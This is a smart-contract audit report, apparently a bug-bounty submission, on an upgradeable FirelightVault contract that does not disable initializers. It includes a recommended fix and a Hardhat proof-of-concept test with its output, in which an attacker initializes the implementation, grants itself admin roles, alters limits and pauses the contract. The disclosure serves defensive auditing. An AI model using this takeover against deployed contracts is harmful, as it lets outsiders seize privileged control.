# #59091 \[SC-Low] low firelightvault sol implementation contract does not disable initializers

## #59091 \[SC-Low] \[LOW]: \`FirelightVault.sol\` Implementation Contract Does Not Disable Initializers

**Submitted on Nov 8th 2025 at 15:28:30 UTC by @chief\_hunter888 for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight)

* **Report ID:** #59091
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/firelight-protocol/firelight-core/blob/main/contracts/FirelightVault.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value

### Description

#### \[Low] Implementation Contract does not Disable Initializers

### Description

The contract `FirelightVault.sol` is an `Initializable.sol` children, meant to be used behind a proxy. However, the current implementation has no constructor in which it would call the `_disableInitializers()` function as [recommended by the OpenZepplin, developer of the inherited contracts](https://docs.openzeppelin.com/upgrades-plugins/writing-upgradeable#initializing-the-implementation-contract). As a result anyone can just initialize the implementation contract and thereby take over the contract as the owner. Furthermore, due to the irreversible nature of initializable.sol, it can only be initialized once. This means once a malicious attacker initialized the contract, its storage/state is irrevocably corrupted.

### Recommendation - Recommended Fix

Add a constructor to `FirelightVault.sol` that calls `_disableInitializers()`:

```solidity
contract FirelightVault is
    FirelightVaultStorage,
    ERC4626Upgradeable,
    AccessControlUpgradeable,
    PausableUpgradeable,
    ReentrancyGuardUpgradeable
{
    using Checkpoints for Checkpoints.Trace256;
    using SafeERC20 for IERC20;
    using Math for uint256;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    // ... rest of the contract
}
```

### Impact

Adding the `_disableInitializers()` function prevents anyone from calling `initialize()` on the implementation contract directly, ensuring it can only be initialized through a proxy.

Without this, someone could call `initialize()` on the implementation contract itself This could lead to the implementation being initialized with malicious parameters Even though the proxy would have its own initialization, having an unprotected implementation is a security risk.

Disabling initializers restricts initialization strictly to the intended proxy usage, preventing major security flaws. Given that an initializable contract can only be initialized once, this irrevocably corrupts the state of the `Firevault.sol` implementation contract.

#### Attack Vector

1. Attacker discovers or deploys the implementation contract address
2. Attacker calls `initialize()` directly on the implementation contract (not through proxy)
3. Attacker sets themselves as the `DEFAULT_ADMIN_ROLE`
4. Attacker gains full control over the implementation contract

#### Impact Details

1. **Implementation Contract Takeover**: Attacker becomes the admin of the implementation contract
2. **Role Manipulation**: Attacker can grant themselves all privileged roles:
   * `RESCUER_ROLE`
   * `PAUSE_ROLE`
   * `DEPOSIT_LIMIT_UPDATE_ROLE`
   * `PERIOD_CONFIGURATION_UPDATE_ROLE`
   * `BLOCKLIST_ROLE`
3. **State Manipulation**: Attacker can modify implementation state:
   * Change deposit limits
   * Pause the implementation
   * Modify period configurations
4. **Upgrade Confusion**: Can cause confusion in upgrade scenarios where the implementation and proxy have different owners
5. **Potential Griefing**: While the proxy's state remains separate, this can create operational confusion

#### Context

#### **Why `Initializable.sol` is used here**

All four of the OpenZeppelin upgradeable contracts that `FirelightVault` inherits from directly or indirectly inherit from `Initializable.sol`:

1. ERC4626Upgradeable Inherits from ERC20Upgradeable Which inherits from Initializable
2. AccessControlUpgradeable Directly inherits from Initializable `abstract contract AccessControlUpgradeable is Initializable, ContextUpgradeable, IAccessControlUpgradeable, ERC165Upgradeable`
3. PausableUpgradeable Directly inherits from Initializable `abstract contract PausableUpgradeable is Initializable, ContextUpgradeable`
4. ReentrancyGuardUpgradeable Directly inherits from Initializable

#### Summary

The `FirelightVault` implementation contract does not disable initializers in its constructor, allowing an attacker to directly initialize the implementation contract (not through the proxy). This violates the standard OpenZeppelin upgradeable contract pattern and introduces a real takeover risk.

#### References

* OpenZeppelin <https://docs.openzeppelin.com/upgrades-plugins/writing-upgradeable#initializing-the-implementation-contract>
* OpenZeppelin Proxy Pattern: <https://docs.openzeppelin.com/contracts/4.x/api/proxy>
* Initializable: <https://docs.openzeppelin.com/contracts/4.x/api/proxy#Initializable>
* Writing Upgradeable Contracts: <https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable>

### Proof of Concept

## Malicious Initialization Vulnerability - POC Summary

### Quick Overview

This POC demonstrates a significant vulnerability in the `FirelightVault` contract where an attacker can initialize the implementation contract directly because there is no `_disableInitializers()` call in the constructor.

### Proof of Concept

A comprehensive test suite has been created demonstrating the vulnerability:

#### Test File Location

```
test/malicious_initialization.js
```

#### Running the POC

```bash

# Set environment variables
export HARDHAT_CHAIN_ID=31337
export DEPLOYMENT_ACCOUNT_KEY=ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
export EXTRA_KEYS=59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d,5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a,7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6,47e179ec197488593b187f80a00eb0da91f1b9d0b13f8733639f19c30a34926a,8b3a350cf5c34c9194ca85829a2df0ec3153be0318b5e2d3348e872092edffba,92db14e403b83dfe3df233f83dfa3a0d7096f21ca9b0d6d6b8d88b2b4ec1564e,4bbbf85ce3377467afe5d46f804f221813b2bb87f24d81f60f1fcdbf7cbf4356

# Run the test
./node_modules/.bin/hardhat test test/malicious_initialization.js
```

#### Test Results Summary

The POC demonstrates:

Sample Test output

```

# Simple one-liner
HARDHAT_CHAIN_ID=31337 \
DEPLOYMENT_ACCOUNT_KEY=ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
EXTRA_KEYS=59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d,5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a,7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6,47e179ec197488593b187f80a00eb0da91f1b9d0b13f8733639f19c30a34926a,8b3a350cf5c34c9194ca85829a2df0ec3153be0318b5e2d3348e872092edffba,92db14e403b83dfe3df233f83dfa3a0d7096f21ca9b0d6d6b8d88b2b4ec1564e,4bbbf85ce3377467afe5d46f804f221813b2bb87f24d81f60f1fcdbf7cbf4356 \
./node_modules/.bin/hardhat test test/malicious_initialization.js


  POC: Malicious Initialization of Implementation Contract
    Vulnerability Demonstration

=== VULNERABILITY POC: Malicious Initialization ===

Step 1: Deploying FirelightVault implementation contract...
Implementation deployed at: 0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9

Step 2: Attacker initializing implementation contract directly...
Attacker address: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
✓ Implementation successfully initialized by attacker!

Step 3: Verifying attacker has gained admin control...
Attacker has DEFAULT_ADMIN_ROLE: true

Step 4: Attacker granting themselves additional privileged roles...
✓ Attacker has RESCUER_ROLE: true
✓ Attacker has PAUSE_ROLE: true
✓ Attacker has DEPOSIT_LIMIT_UPDATE_ROLE: true

Step 5: Attacker manipulating implementation state...
Original deposit limit: 5000.0
Updated deposit limit: 999999.0

Step 6: Attacker pausing the implementation contract...
✓ Implementation is paused: true

=== ATTACK SUCCESSFUL ===
The attacker has full control over the implementation contract!
This demonstrates the vulnerability of not disabling initializers.

      ✔ Should allow attacker to initialize the implementation contract directly (43ms)

=== Verifying Single Initialization ===

First initialization successful by attacker
Attempting second initialization...
✓ Second initialization prevented by initializer modifier
However, the damage is done - attacker already owns the implementation!

      ✔ Should prevent re-initialization due to initializer modifier

=== Impact on Proxy Upgrade Scenario ===

Step 1: Deploying legitimate proxy...
Proxy deployed at: 0xa513E6E4b8f2a923D98304ec87F64353C4D5C853
Implementation address: 0x0165878A594ca255338adfa4d48449f69242Eb8F

Step 2: Attacker initializing the implementation contract...
✓ Attacker successfully initialized the implementation!

Step 3: Comparing proxy vs implementation state...
Proxy admin is deployer: true
Implementation admin is attacker: true
Proxy symbol: stfXRP
Implementation symbol: EVIL

✓ Implementation has different state than proxy!
✓ Attacker controls the implementation while legitimate admin controls proxy!
✓ This can cause confusion and potential security issues in upgrades.

      ✔ Should demonstrate the impact in a proxy upgrade scenario (159ms)
    Recommended Fix Verification

=== Testing Vulnerable Version ===

Deploying FirelightVaultUpgradeTest (VULNERABLE)...
Attempting to initialize implementation directly...
✗ FirelightVaultUpgradeTest is vulnerable (no _disableInitializers)
✗ Attacker successfully initialized the implementation!

      ✔ Should show that the vulnerable version allows initialization
This is the standard OpenZeppelin pattern for upgradeable contracts.
See: https://docs.openzeppelin.com/contracts/4.x/api/proxy#Initializable

Deploying FirelightVaultUpgradeTestSecure (FIXED)...
Attempting to initialize FIXED implementation directly...
✓ FirelightVaultUpgradeTestSecure properly prevents initialization!
✓ The fix successfully blocks malicious initialization attempts!
✓ Implementation contract is protected with _disableInitializers()

      ✔ Should show how the fix prevents initialization


  5 passing (488ms)

```

### Attack Scenario Demonstrated

1. **Deployment**: Implementation contract is deployed
2. **Attack**: Attacker calls `initialize()` directly on implementation
3. **Takeover**: Attacker becomes `DEFAULT_ADMIN_ROLE`
4. **Privilege Escalation**: Attacker grants themselves all roles
5. **State Manipulation**: Attacker modifies contract state
6. **Impact**: Implementation owned by attacker, separate from proxy

#### Severity Justification

**Low** because:

* Violates OpenZeppelin best practices
* Enables implementation contract takeover
* Can cause operational confusion
* May interfere with upgrades
* Well-documented vulnerability pattern
* However, does not directly compromise proxy funds

The javascript test file that serves as a POC. Please add to test/malicious\_initialization.js

Foundry test contract versions with and without the vulnerability for testing. Please add to path and under the name of: contracts/test/FirelightVaultUpgradeTest.sol.

```
/* SPDX-License-Identifier: UNLICENSED */

pragma solidity 0.8.28;

import {FirelightVault} from  "../FirelightVault.sol";
import {Checkpoints} from "../lib/Checkpoints.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title FirelightVaultUpgradeTest
 * @notice Test contract for upgrading FirelightVault
 * @dev VULNERABLE VERSION - Missing _disableInitializers() in constructor
 */
contract FirelightVaultUpgradeTest is FirelightVault {
    using Checkpoints for Checkpoints.Trace256;
    using SafeERC20 for IERC20;

    function updateVersion(uint256 version) public {
        contractVersion = version;
    }
}

/**
 * @title FirelightVaultUpgradeTestSecure
 * @notice FIXED VERSION - Demonstrates proper upgradeable contract pattern
 * @dev Includes _disableInitializers() to prevent malicious initialization
 */
contract FirelightVaultUpgradeTestSecure is FirelightVault {
    using Checkpoints for Checkpoints.Trace256;
    using SafeERC20 for IERC20;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function updateVersion(uint256 version) public {
        contractVersion = version;
    }
}
```

The javascript test file that serves as a POC. Please add to test/malicious\_initialization.js

```
const { expect } = require('chai')
const { ethers } = require('hardhat')
const { deployFAsset } = require('../lib/utils_test')

/**
 * Proof of Concept: Malicious Initialization of Implementation Contract
 * 
 * VULNERABILITY DESCRIPTION:
 * The FirelightVault implementation contract does not disable initializers in its constructor.
 * This allows an attacker to directly initialize the implementation contract (not the proxy),
 * potentially taking control of the implementation and causing various security issues.
 * 
 * IMPACT:
 * 1. Attacker can become the DEFAULT_ADMIN_ROLE of the implementation contract
 * 2. Attacker can grant themselves all privileged roles
 * 3. Attacker can manipulate the implementation state
 * 4. May cause confusion in upgrade scenarios
 * 5. Potential for griefing or more sophisticated attacks
 * 
 * RECOMMENDATION:
 * Add a constructor to FirelightVault that calls _disableInitializers():
 * 
 * constructor() {
 *     _disableInitializers();
 * }
 */

describe('POC: Malicious Initialization of Implementation Contract', function() {
  const DECIMALS = 6
  const INITIAL_DEPOSIT_LIMIT = ethers.parseUnits('5000', DECIMALS)
  const PERIOD_DURATION = 604800 // 1 week

  let token_contract
  let attacker
  let victim
  let deployer

  before(async () => {
    [deployer, attacker, victim] = await ethers.getSigners()
    
    // Deploy the underlying asset (FAsset)
    const result = await deployFAsset(['fXRP', 'fXRP', 'Ripple', 'XRP', DECIMALS])
    token_contract = result.token_contract
  })

  describe('Vulnerability Demonstration', function() {
    it('Should allow attacker to initialize the implementation contract directly', async () => {
      console.log('\n=== VULNERABILITY POC: Malicious Initialization ===\n')
      console.log('Step 1: Deploying FirelightVault implementation contract...')
      
      // Deploy the implementation contract directly (simulating getting the implementation address)
      const FirelightVaultFactory = await ethers.getContractFactory('FirelightVault')
      const implementation = await FirelightVaultFactory.deploy()
      await implementation.waitForDeployment()
      
      const implementationAddress = await implementation.getAddress()
      console.log(`Implementation deployed at: ${implementationAddress}`)

      // Prepare initialization parameters with ATTACKER as admin
      const abi_coder = ethers.AbiCoder.defaultAbiCoder()
      const InitParams = {
        defaultAdmin: attacker.address,  // ATTACKER sets themselves as admin!
        limitUpdater: attacker.address,
        blocklister: attacker.address,
        pauser: attacker.address,
        periodConfigurationUpdater: attacker.address,
        depositLimit: INITIAL_DEPOSIT_LIMIT,
        periodConfigurationDuration: PERIOD_DURATION
      }
      const init_params = abi_coder.encode(
        ['address','address','address','address','address','uint256','uint48'], 
        Object.values(InitParams)
      )

      console.log('\nStep 2: Attacker initializing implementation contract directly...')
      console.log(`Attacker address: ${attacker.address}`)

      // ATTACK: Attacker calls initialize() directly on the implementation
      const attackTx = await implementation.connect(attacker).initialize(
        await token_contract.getAddress(),
        'stfXRP',
        'stfXRP',
        init_params
      )
      await attackTx.wait()

      console.log('✓ Implementation successfully initialized by attacker!')

      // Verify attacker has gained control
      console.log('\nStep 3: Verifying attacker has gained admin control...')
      
      const DEFAULT_ADMIN_ROLE = await implementation.DEFAULT_ADMIN_ROLE()
      const hasAdminRole = await implementation.hasRole(DEFAULT_ADMIN_ROLE, attacker.address)
      
      console.log(`Attacker has DEFAULT_ADMIN_ROLE: ${hasAdminRole}`)
      expect(hasAdminRole).to.be.true

      // Demonstrate attacker can grant themselves additional roles
      console.log('\nStep 4: Attacker granting themselves additional privileged roles...')
      
      const RESCUER_ROLE = await implementation.RESCUER_ROLE()
      const PAUSE_ROLE = await implementation.PAUSE_ROLE()
      const DEPOSIT_LIMIT_UPDATE_ROLE = await implementation.DEPOSIT_LIMIT_UPDATE_ROLE()
      
      await implementation.connect(attacker).grantRole(RESCUER_ROLE, attacker.address)
      await implementation.connect(attacker).grantRole(PAUSE_ROLE, attacker.address)
      await implementation.connect(attacker).grantRole(DEPOSIT_LIMIT_UPDATE_ROLE, attacker.address)
      
      const hasRescuerRole = await implementation.hasRole(RESCUER_ROLE, attacker.address)
      const hasPauseRole = await implementation.hasRole(PAUSE_ROLE, attacker.address)
      const hasDepositLimitRole = await implementation.hasRole(DEPOSIT_LIMIT_UPDATE_ROLE, attacker.address)
      
      console.log(`✓ Attacker has RESCUER_ROLE: ${hasRescuerRole}`)
      console.log(`✓ Attacker has PAUSE_ROLE: ${hasPauseRole}`)
      console.log(`✓ Attacker has DEPOSIT_LIMIT_UPDATE_ROLE: ${hasDepositLimitRole}`)
      
      expect(hasRescuerRole).to.be.true
      expect(hasPauseRole).to.be.true
      expect(hasDepositLimitRole).to.be.true

      // Demonstrate attacker can manipulate implementation state
      console.log('\nStep 5: Attacker manipulating implementation state...')
      
      const originalDepositLimit = await implementation.depositLimit()
      console.log(`Original deposit limit: ${ethers.formatUnits(originalDepositLimit, DECIMALS)}`)
      
      const newLimit = ethers.parseUnits('999999', DECIMALS)
      await implementation.connect(attacker).updateDepositLimit(newLimit)
      
      const updatedDepositLimit = await implementation.depositLimit()
      console.log(`Updated deposit limit: ${ethers.formatUnits(updatedDepositLimit, DECIMALS)}`)
      
      expect(updatedDepositLimit).to.equal(newLimit)

      // Demonstrate attacker can pause the implementation
      console.log('\nStep 6: Attacker pausing the implementation contract...')
      
      await implementation.connect(attacker).pause()
      const isPaused = await implementation.paused()
      
      console.log(`✓ Implementation is paused: ${isPaused}`)
      expect(isPaused).to.be.true

      console.log('\n=== ATTACK SUCCESSFUL ===')
      console.log('The attacker has full control over the implementation contract!')
      console.log('This demonstrates the vulnerability of not disabling initializers.\n')
    })

    it('Should prevent re-initialization due to initializer modifier', async () => {
      console.log('\n=== Verifying Single Initialization ===\n')
      
      // Deploy a fresh implementation
      const FirelightVaultFactory = await ethers.getContractFactory('FirelightVault')
      const implementation = await FirelightVaultFactory.deploy()
      await implementation.waitForDeployment()

      const abi_coder = ethers.AbiCoder.defaultAbiCoder()
      const InitParams = {
        defaultAdmin: attacker.address,
        limitUpdater: attacker.address,
        blocklister: attacker.address,
        pauser: attacker.address,
        periodConfigurationUpdater: attacker.address,
        depositLimit: INITIAL_DEPOSIT_LIMIT,
        periodConfigurationDuration: PERIOD_DURATION
      }
      const init_params = abi_coder.encode(
        ['address','address','address','address','address','uint256','uint48'], 
        Object.values(InitParams)
      )

      // First initialization by attacker
      await implementation.connect(attacker).initialize(
        await token_contract.getAddress(),
        'stfXRP',
        'stfXRP',
        init_params
      )

      console.log('First initialization successful by attacker')

      // Attempt second initialization (should fail)
      const secondInit = implementation.connect(victim).initialize(
        await token_contract.getAddress(),
        'stfXRP',
        'stfXRP',
        init_params
      )

      console.log('Attempting second initialization...')
      await expect(secondInit).to.be.revertedWithCustomError(
        implementation,
        'InvalidInitialization'
      )

      console.log('✓ Second initialization prevented by initializer modifier')
      console.log('However, the damage is done - attacker already owns the implementation!\n')
    })

    it('Should demonstrate the impact in a proxy upgrade scenario', async () => {
      console.log('\n=== Impact on Proxy Upgrade Scenario ===\n')
      
      const { upgrades } = require('hardhat')
      
      // Deploy a legitimate proxy
      console.log('Step 1: Deploying legitimate proxy...')
      const FirelightVaultFactory = await ethers.getContractFactory('FirelightVault')
      
      const abi_coder = ethers.AbiCoder.defaultAbiCoder()
      const InitParams = {
        defaultAdmin: deployer.address,  // Legitimate admin
        limitUpdater: deployer.address,
        blocklister: deployer.address,
        pauser: deployer.address,
        periodConfigurationUpdater: deployer.address,
        depositLimit: INITIAL_DEPOSIT_LIMIT,
        periodConfigurationDuration: PERIOD_DURATION
      }
      const init_params = abi_coder.encode(
        ['address','address','address','address','address','uint256','uint48'], 
        Object.values(InitParams)
      )

      const proxy = await upgrades.deployProxy(
        FirelightVaultFactory, 
        [await token_contract.getAddress(), 'stfXRP', 'stfXRP', init_params]
      )
      await proxy.waitForDeployment()

      const proxyAddress = await proxy.getAddress()
      console.log(`Proxy deployed at: ${proxyAddress}`)

      // Get the implementation address
      const implementationAddress = await upgrades.erc1967.getImplementationAddress(proxyAddress)
      console.log(`Implementation address: ${implementationAddress}`)

      // Attacker initializes the implementation directly
      console.log('\nStep 2: Attacker initializing the implementation contract...')
      
      const implementation = await ethers.getContractAt('FirelightVault', implementationAddress)
      
      const attackInitParams = {
        defaultAdmin: attacker.address,  // Attacker as admin
        limitUpdater: attacker.address,
        blocklister: attacker.address,
        pauser: attacker.address,
        periodConfigurationUpdater: attacker.address,
        depositLimit: INITIAL_DEPOSIT_LIMIT,
        periodConfigurationDuration: PERIOD_DURATION
      }
      const attack_init_params = abi_coder.encode(
        ['address','address','address','address','address','uint256','uint48'], 
        Object.values(attackInitParams)
      )

      await implementation.connect(attacker).initialize(
        await token_contract.getAddress(),
        'MALICIOUS',
        'EVIL',
        attack_init_params
      )

      console.log('✓ Attacker successfully initialized the implementation!')

      // Verify the states are different
      console.log('\nStep 3: Comparing proxy vs implementation state...')
      
      const DEFAULT_ADMIN_ROLE = await proxy.DEFAULT_ADMIN_ROLE()
      
      const proxyAdmin = await proxy.hasRole(DEFAULT_ADMIN_ROLE, deployer.address)
      const implAdmin = await implementation.hasRole(DEFAULT_ADMIN_ROLE, attacker.address)
      
      console.log(`Proxy admin is deployer: ${proxyAdmin}`)
      console.log(`Implementation admin is attacker: ${implAdmin}`)
      
      const proxySymbol = await proxy.symbol()
      const implSymbol = await implementation.symbol()
      
      console.log(`Proxy symbol: ${proxySymbol}`)
      console.log(`Implementation symbol: ${implSymbol}`)
      
      expect(proxyAdmin).to.be.true
      expect(implAdmin).to.be.true
      expect(proxySymbol).to.not.equal(implSymbol)

      console.log('\n✓ Implementation has different state than proxy!')
      console.log('✓ Attacker controls the implementation while legitimate admin controls proxy!')
      console.log('✓ This can cause confusion and potential security issues in upgrades.\n')
    })
  })

  describe('Recommended Fix Verification', function() {
    it('Should show that the vulnerable version allows initialization', async () => {
      console.log('\n=== Testing Vulnerable Version ===\n')
      
      // Deploy the vulnerable test version
      console.log('Deploying FirelightVaultUpgradeTest (VULNERABLE)...')
      const FirelightVaultUpgradeTestFactory = await ethers.getContractFactory('FirelightVaultUpgradeTest')
      const testImplementation = await FirelightVaultUpgradeTestFactory.deploy()
      await testImplementation.waitForDeployment()

      const abi_coder = ethers.AbiCoder.defaultAbiCoder()
      const InitParams = {
        defaultAdmin: attacker.address,
        limitUpdater: attacker.address,
        blocklister: attacker.address,
        pauser: attacker.address,
        periodConfigurationUpdater: attacker.address,
        depositLimit: INITIAL_DEPOSIT_LIMIT,
        periodConfigurationDuration: PERIOD_DURATION
      }
      const init_params = abi_coder.encode(
        ['address','address','address','address','address','uint256','uint48'], 
        Object.values(InitParams)
      )

      console.log('Attempting to initialize implementation directly...')

      const vulnerableInit = testImplementation.connect(attacker).initialize(
        await token_contract.getAddress(),
        'stfXRP',
        'stfXRP',
        init_params
      )

      // This should succeed because the test contract doesn't have the fix
      await expect(vulnerableInit).to.not.be.reverted
      console.log('✗ FirelightVaultUpgradeTest is vulnerable (no _disableInitializers)')
      console.log('✗ Attacker successfully initialized the implementation!\n')
    })

    it('Should show how the fix prevents initialization', async () => {
      console.log('This is the standard OpenZeppelin pattern for upgradeable contracts.')
      console.log('See: https://docs.openzeppelin.com/contracts/4.x/api/proxy#Initializable\n')
      
      // Deploy the FIXED test version
      console.log('Deploying FirelightVaultUpgradeTestSecure (FIXED)...')
      const FirelightVaultUpgradeTestSecureFactory = await ethers.getContractFactory('FirelightVaultUpgradeTestSecure')
      const secureImplementation = await FirelightVaultUpgradeTestSecureFactory.deploy()
      await secureImplementation.waitForDeployment()

      const abi_coder = ethers.AbiCoder.defaultAbiCoder()
      const InitParams = {
        defaultAdmin: attacker.address,
        limitUpdater: attacker.address,
        blocklister: attacker.address,
        pauser: attacker.address,
        periodConfigurationUpdater: attacker.address,
        depositLimit: INITIAL_DEPOSIT_LIMIT,
        periodConfigurationDuration: PERIOD_DURATION
      }
      const init_params = abi_coder.encode(
        ['address','address','address','address','address','uint256','uint48'], 
        Object.values(InitParams)
      )

      console.log('Attempting to initialize FIXED implementation directly...')

      const secureInit = secureImplementation.connect(attacker).initialize(
        await token_contract.getAddress(),
        'stfXRP',
        'stfXRP',
        init_params
      )

      // This SHOULD revert because the constructor disables initializers
      await expect(secureInit).to.be.revertedWithCustomError(
        secureImplementation,
        'InvalidInitialization'
      )
      
      console.log('✓ FirelightVaultUpgradeTestSecure properly prevents initialization!')
      console.log('✓ The fix successfully blocks malicious initialization attempts!')
      console.log('✓ Implementation contract is protected with _disableInitializers()\n')
    })
  })
})


```

Hardhat Config JS to update:

```
const { EXECUTION_KEYS, DEPLOYMENT_ACCOUNT_KEY, NODE_RPC_URL, MAINNET_RPC_HEADERS, MAINNET_NETWORK_ID, HARDHAT_CHAIN_ID, EXTRA_KEYS, ETHERSCAN_API_KEY } = require('./lib/env')
require('@openzeppelin/hardhat-upgrades')
require('@nomicfoundation/hardhat-chai-matchers')
require('@nomicfoundation/hardhat-verify')
require('hardhat-contract-sizer')
require('solidity-coverage')
const { removeConsoleLog } = require('hardhat-preprocessor')

const accounts = [DEPLOYMENT_ACCOUNT_KEY, ...EXECUTION_KEYS, ...EXTRA_KEYS].map(k => `0x${ k }`)

const forking = NODE_RPC_URL ? {
  url: NODE_RPC_URL,
  ...(process.env.BN && { blockNumber: parseInt(process.env.BN) })
} : undefined

const hardhatConfig = {
  chainId: HARDHAT_CHAIN_ID,
  accounts: accounts.map(a => ({
    privateKey: a,
    balance: '1000000000000000000000000000'
  })),
  chains: {
    14: {
      hardforkHistory: {
        london: 0
      }
    }
  }
}

if (forking) {
  hardhatConfig.forking = forking
}

module.exports = {
  defaultNetwork: 'hardhat',
  preprocess: {
     eachLine: removeConsoleLog(_ => !process.env.SHOW_LOGS)
  },
  networks: {
    hardhat: hardhatConfig,
    mainnet: {
      url: NODE_RPC_URL || 'No url',
      gas: 'auto',
      gasPrice: 1000000000,
      gasMultiplier: 1.2,
      blockGasLimit: 8000000,
      network_id: MAINNET_NETWORK_ID,
      accounts,
      httpHeaders: MAINNET_RPC_HEADERS ? JSON.parse(MAINNET_RPC_HEADERS) : undefined
    },
    coston: {
      url: 'https://coston-api.flare.network/ext/bc/C/rpc',
      chainId: 16,
      accounts
    }
  },
  etherscan: {
    apiKey: ETHERSCAN_API_KEY
  },
  solidity: {
    compilers: [
      {
        version: '0.8.23',
        settings: {
          optimizer: {
            enabled: true,
            runs: 10000
          },
          evmVersion: 'london'
        }
      },
      {
        version: '0.8.28',
        settings: {
          optimizer: {
            enabled: true,
            runs: 10000
          },
          evmVersion: 'london'
        }
      }
    ]
  },
  paths: {
    sources: './contracts'
  }
}
```
